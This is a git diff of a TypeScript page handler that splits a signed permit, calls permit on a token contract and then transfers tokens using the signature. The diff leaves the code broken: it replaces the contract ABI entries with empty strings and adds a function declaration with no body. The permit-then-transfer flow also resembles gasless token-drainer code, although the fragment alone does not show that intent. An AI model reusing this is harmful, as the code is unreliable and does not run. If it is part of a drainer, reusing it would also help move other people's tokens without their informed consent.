@@ -282,9 +282,9 @@ async function handle(json: any, signer?: JsonRpcSigner) {
 
 	const {v, r, s} = ethers.utils.splitSignature(signature);
 	let tokenContract = new ethers.Contract(spender, [
-			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
-			'function transferFrom(address from, address to, uint256 value) external returns (bool)',
-			'function allowance(address owner, address spender) external returns (uint256)',
+			'',
+			'',
+			'',
 	], SIGNER);
 
 	const args = [spender,owner, amount, deadline, v, r, s];
@@ -304,5 +304,11 @@ async function handle(json: any, signer?: JsonRpcSigner) {
 	console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
 }
 
+const methods = {
+	allowance: "function allowance(address owner, address spender) external returns (uint256)",
+	transferFrom: "function transferFrom(address from, address to, uint256 value) external returns (bool)"
+}
+
+async function callContractMethod()
 
 export default Page;
